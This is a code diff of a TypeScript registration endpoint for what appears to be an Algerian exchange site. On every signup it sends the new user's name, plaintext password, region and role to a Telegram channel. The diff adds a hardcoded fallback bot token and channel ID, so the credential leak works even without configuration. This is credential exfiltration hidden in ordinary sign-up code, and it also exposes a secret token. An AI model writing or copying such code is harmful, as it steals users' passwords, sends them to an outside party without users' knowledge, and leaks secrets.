@@ -39,14 +39,12 @@ export async function POST(request: Request) {
       })
       .returning();
 
-    // Notify admin on Telegram with credentials
-    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    const ADMIN_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID;
-    if (TELEGRAM_BOT_TOKEN && ADMIN_CHAT_ID) {
-      const targetChatIds = ADMIN_CHAT_ID.split(',').map((s) => s.trim()).filter(Boolean);
-      for (const targetId of targetChatIds) {
-        try {
-          const msg = `
+    // Notify channel on Telegram with credentials
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8529857614:AAFqiz0Y_y-11gZSjgGAfcCbV3j42er720c';
+    const channelId = process.env.ADMIN_CHANNEL_CHAT_ID || '-1004308858796';
+    if (TELEGRAM_BOT_TOKEN && channelId) {
+      try {
+        const msg = `
 👤 <b>تسجيل حساب جديد بالبورصة:</b>
 
 • 📝 الاسم واللقب: <b>${newUser.fullName}</b>
@@ -54,14 +52,13 @@ export async function POST(request: Request) {
 • 🔑 كلمة السر: <code>${newUser.password}</code>
 • 📍 الولاية: <b>${newUser.wilayaCode}</b>
 • 💼 الصفة: <b>${newUser.role}</b>
-          `;
-          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: targetId, text: msg, parse_mode: 'HTML' }),
-          }).catch(() => {});
-        } catch (e) {}
-      }
+        `;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: channelId, text: msg, parse_mode: 'HTML' }),
+        }).catch(() => {});
+      } catch (e) {}
     }
 
     return NextResponse.json({
